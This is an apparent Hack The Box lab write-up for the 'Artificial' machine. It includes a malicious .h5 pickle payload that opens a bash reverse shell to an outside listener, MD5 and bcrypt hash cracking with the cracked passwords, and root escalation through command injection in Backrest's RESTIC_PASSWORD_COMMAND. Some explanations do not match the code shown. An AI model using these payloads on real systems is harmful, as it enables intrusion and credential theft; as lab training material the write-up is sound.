![[Artificial.png]]
# 📜 HTB Artificial – Pentest Report

Machine Name: Artificial  
IP Address: 10.10.11.74  
Operating System: Linux  
Difficulty: Easy  
User: gael  
Root Access: restic + exposed ssh private key from /root/.ssh backup

---

## 🔍 1. Nmap Scan

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.74
```

| Option            | Description                                                      |
| ----------------- | ---------------------------------------------------------------- |
| `-Pn`             | Skip host discovery (assume host is up — good for HTB VPN boxes) |
| `-p-`             | Scan all **65,535** TCP ports                                    |
| `--min-rate=1000` | Send packets quickly (1,000 per second minimum)                  |
| `-T4`             | Aggressive timing template                                       |

**Results:**

- `22/tcp` – SSH
    
- `80/tcp` – HTTP
    
- `9898/tcp` – Backrest UI (localhost only)
    

---

## 🌐 2. Web Enumeration

- Explored `http://artificial.htb`
    
- Noticed: Register/login form

### Gobuster

Gobuster was ran to 
```bash
gobuster dir -u http://artificial.htb -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```

Using gobuster allows me to brute force directories using the common wordlist in this case and was able to find /register endpoint.

![[Screenshot 2025-07-01 214235.png]]
- `/register` endpoint found, created user 
	Username: test
	Email: test@hotmail.com
	Password: test
	
- Authenticated to dashboard UI: TensorFlow/Keras model upload feature
    
- Upload page acceptes `.h5` model file uploads
    

This suggested a TensorFlow `.h5` model deserialization vulnerability could lead to RCE.

---
## 🧠 TensorFlow Exploit

Researching brought me to TensorFlow Remote Code Execution with Malicious Mode 
https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

### Virtual Environment

```python
python3 -m venv tfvenv
source tfvenv/bin/activate
pip install tensorflow h5py
```

### Malicious Payload

![[Screenshot 2025-07-02 111552 1.png]]

```bash
# make_backdoor_model.py
import os
import tensorflow as tf
import h5py

class RCE:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'",))

with h5py.File('malicious_model.h5', 'w') as f:
    f.attrs['model_config'] = [RCE()]
```

The most important part is the `Lambda` layer the other layer is just there for show. However in a real scenario this malicious layer would probably be hidden with tens of other legitimate layers in a working model so that no suspicions arise.

The script above will create an `exploit.h5` which when loaded will execute the serialized `exploit` function and create the file `/tmp/pwned`. You should note that when saving the model the `exploit` function will also be executed (aka don't put `rm -rf /` in there or you'll end up bricking your own box.

Run the script:

```python
python3 make_backdoor_model.py
```

Running the script created the malicious .h5 file for upload to artificial.htb
### Reverse Shell

```bash
nc -lvnp 4444
```

![[Screenshot 2025-07-01 220548.png]]
- Upload `malicious_model.h5` in dashboard
![[Screenshot 2025-07-02 113037.png]]
 Uploading the malicous .h5 file and viewing predictions triggered the reverse shell back the the netcat listener.

- Got reverse shell as container user
	After failed attempt on port 4444 tried again on 6666 and got the reverse shell
![[Screenshot 2025-07-02 183321.png]]

---

## 💪 Shell Stabilization

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo
fg
export TERM=xterm
```

When getting a shell it is barebones and can be missing features. This allows for the Kali terminal to behave properly for forwarding shell input. Makes the shell:

- Interactive
    
- Stable
    
- Supports editors like `vim`, `nano`
    
- Allows use of programs like `less`, `htop`, or `ssh`

https://darshan-2.gitbook.io/penetration-testing-checklist/reverse-shells/stabilizing-shell

---

## 🧰 User Enumeration

Once the shell is stabilized could begin digging around for useful folders and usernames or passwords. Being inside RCE tensorFlow model implies a container that runs flask so the app code should be in the container filesystem. Common places to look:

- `/app`
    
- `/var/www`
    
- `/srv`
    
- `/home/user/app`

Seeing app.py and look to find:

- Flask `@app.route` definitions
    
- Database connection info
    
- Secret keys
    
- Upload paths
    
- Hardcoded credentials

- Found Flask config using SQLite DB: `sqlite:///users.db`
    
- Navigated to `instance/users.db`

HTB boxes often include: (HTB Academy)

- Flask/Django apps look for `app.py`, `manage.py`, `settings.py`
    
- Misconfigured uploads
    
- SQLite DBs (`*.db`)
    
- Secret keys or JWT tokens

```bash
ls -la /app
cat app.py
```

Looking at /app/app.py

```python
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
```

Confirming the web app using SQLAlchemy with local file users.db in an instance folder common for flask apps.

Use SQLite CLI I searched for:

```sql
sqlite3 instance/users.db
```

- Extracted MD5 hashes from the user table:

```sql
sqlite3 instance/users.db "SELECT * FROM user"
```

1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|gliat|gliat@artificial.htb|6e58c93b8b800ef970eb6a3bb9af15f6
7|oscrega|osbsnl@gmail.com|249fbacfb3a1e9b78d40c88bb25d0777
8|oscrega2|hhhh@gmail.com|e61e7de603852182385da5e907b4b232
9|test|test@hotmail.com|098f6bcd4621d373cade4e832627b4f6
10|oscar|oscar@gmail.com|f156e7995d521f30e6c59a3d6c75e1e5

Saved hashes to hashes.txt

Running john the ripper on the MD5 hashes from the user table using the rockyou wordlist:

```bash
john --format=raw-md5 hashes.txt --wordlist=rockyou.txt
```

![[Screenshot 2025-07-02 190526 1.png]]

John the ripper took quite a while. I should have ran it with GPU support with my RTX 4080 but I will do that next time to speed up the process.

Cracked Credentials:

|          |                      |
| -------- | -------------------- |
| Username | Password             |
| gael     | mattp005numbertwo    |
| royer    | marwinnarak043414036 |
| gliat    | 005683               |
| oscrega2 | hhhh                 |
| test     | test                 |
| oscar    | oscar                |
 
 By luck the first username on the list I tried gael and was able to SSH into the box. Would have tried the others but got in with the gael username.
 
- Password: `mattp005numbertwo`

```bash
ssh gael@10.10.11.74
```

Successful login here and got the user flag located in `/home/gael/user.txt`.

==196493a76108e6f5c0b38369df19820f==

After getting the shell as gael tried to enumerate Local Listening Services:
https://attack.mitre.org/techniques/T1046/

## 🔐 SSH Tunnel & Internal Service

```bash
ss -tuln
```

```bash
ss       # socket statistics
-t       # show TCP sockets
-u       # show UDP sockets
-l       # show listening sockets
-n       # don't resolve service names (e.g., show port 9898 instead of "http-alt")
```

https://man7.org/linux/man-pages/man8/ss.8.html

man ss can be used in Linux to view the manual page with commands.

Linux command for inspecting open ports and listening services. Good site for common Linux ports and their associated services.

```bash
tcp LISTEN 0 4096 127.0.0.1:9898 0.0.0.0:*
```

https://www.speedguide.net/port.php?port=9898

Confirming a service listening on port 9898 (127.0.0.1:9898) locally, unreachable externally.
Seems to be bound to local host only so cant access it directly over the network.
Seeing services listening on 127.0.0.1 in ss, netstat or ps, I'm thinking about SSH Tunneling.

Backrest could be exploited through the GUI to get root access.
Looking at /tmp folder confirms a backrest server

![[Screenshot 2025-07-02 192143.png]]

https://hub.docker.com/r/garethgeorge/backrest

From this website:
`BACKREST_PORT` - the port to bind to. Defaults to 9898

Visiting http://artificial.htb:9898 failed so the Backrest web interface runs locally on loopback. Need to bridge local host to my Kali VM.

https://stackoverflow.com/questions/5280827/can-someone-explain-ssh-tunnel-in-a-simple-way

![[ssh-tunnels.png]]

So SSH tunnel (SSH Port Forwarding) used to forward my local port 9898 to t
```bash
ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
```

| Part                  | Explanation                                                                                                      |
| --------------------- | ---------------------------------------------------------------------------------------------------------------- |
| `ssh`                 | Secure Shell — used to connect to remote machines                                                                |
| `-L`                  | Specifies **local port forwarding**                                                                              |
| `9898:127.0.0.1:9898` | `local_port:remote_host:remote_port` — forwards **your local port 9898** to **127.0.0.1:9898** on the remote box |
| `gael@10.10.11.74`    | SSH into the target box as user `gael` (credentials found earlier via cracking MD5 hashes)                       |

- Accessed Backrest UI via `http://127.0.0.1:9898`
    
- Recovered JWT secret, `restic` binary, and backrest binary


---

## 📦 Privilege Escalation

I had the user root so now need to escalate to root user.
https://steflan-security.com/linux-privilege-escalation-kernel-exploits/
Found this site useful for Linux privilege escalation.

```bash
grep -riE "pass|secret|token|auth|user|admin|login|jwt|cookie" backrest
```

https://builtin.com/articles/grep-command

The `grep` (global regular expression print) command is a tool in [Linux](https://builtin.com/software-engineering-perspectives/linux) and Unix that helps you search for specific text within files. You can use it to find words, phrases or patterns in one or multiple files, making it easier to locate and manage information.

So with the grep command I was able to find the file config.json which contained a bcrypt hash.

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

 The hash was extracted and saved to bcrypt.hash and then used john the ripper with the rockyou word list to crack the hash.

```bash
john --format=bcrypt --wordlist=~/htb/artificial/rockyou.txt bcrypt.hash
```

```bash
echo '$2a$10$cVGlY9WNXQd0gM5ginCmjei2kZR/ACMMkSsspbrutYP5EBZz/!@#$^*' > bcrypt.hash
john --format=bcrypt --wordlist=rockyou.txt bcrypt.hash
```

To login through the backrest UI used:

Username: backrest_root
Password: !@#$^*
### Abuse Backrest + Restic

https://garethgeorge.github.io/backrest/introduction/getting-started/#_3-backup-plan-configuration

Had to setup a repositry on backrest. Tried to use a hook and a dropper but it failed.

![[Screenshot_2025-07-02_210653.webp]]

Set up this repo and then executed.

```bash
Env Vars: RESTIC_PASSWORD_COMMAND=/bin/chmod +s /bin/bash
```


```
Flags: --insecure-no-password -restic-cmd
```
![[Pasted20image2020250622134056.webp]]

#### `RESTIC_PASSWORD_COMMAND` is an **official Restic feature**:

- It lets you dynamically provide a password via the output of a shell command.
    
- But because **Backrest doesn’t sanitize this**, it allows **command injection**.
    
- So instead of a password-generating command like `echo 'secret'`, you can inject a payload like:

```bash
/bin/chmod +s /bin/bash
```

This turns `/bin/bash` into a **SUID binary** — meaning any user (like `gael`) can run it **with root privileges** using:

```bash
/bin/bash -p
```

Was then able to go back to the SSH session as gael then verify /bin/bash has a suid bit

```bash
/bin/bash -p
whoami
# root
```

![[Screenshot 2025-07-02 234904.png]]

Root flag obtained.

==68fefd832970c6d56611480c2772264==

---

## 🏁 6. Flags

- `user.txt`:
    

```
196493a76108e6f5c0b38369df19820f
```

- `root.txt`:
    

```
68fefd832970c6d56611480c2772264
```

---
